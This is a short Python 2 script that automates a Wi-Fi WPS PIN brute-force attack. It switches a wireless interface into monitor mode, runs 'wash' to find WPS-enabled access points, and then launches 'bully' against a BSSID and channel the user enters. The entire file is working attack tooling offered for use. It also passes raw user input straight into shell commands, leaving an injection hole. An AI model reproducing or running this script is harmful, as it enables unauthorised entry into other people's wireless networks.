import subprocess

print "Automation tool for bully by Zarkopafilis"
print ""
print "> ifconfig"
out = subprocess.check_output("ifconfig")
print out
print "> airmon-ng"
out = subprocess.check_output("airmon-ng")
print out
interface = raw_input("Enter interface > ")
x = raw_input("Set to monitor mode > ")
print "Shutting " + interface + "down..."
out = subprocess.check_output("ifconfig " + interface + " down" , shell=True)
print "Setting monitor mode..."
out = subprocess.check_output("iwconfig " + interface + " mode monitor", shell=True)
print "Bringing " + interface + "up"
out = subprocess.check_output("ifconfig " + interface + " up", shell=True)
print "All good"
x = raw_input("Start wash > ")
cmd = "wash -i " + interface + " -C"
print "> " + cmd
subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
bssid = raw_input("Enter BSSID > ")
channel = raw_input("Enter channel > ")
x = raw_input("Start bully > ")
cmd = "bully " + interface + " -b " + bssid + " -c " + channel + " -B"
print "> " + cmd
subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
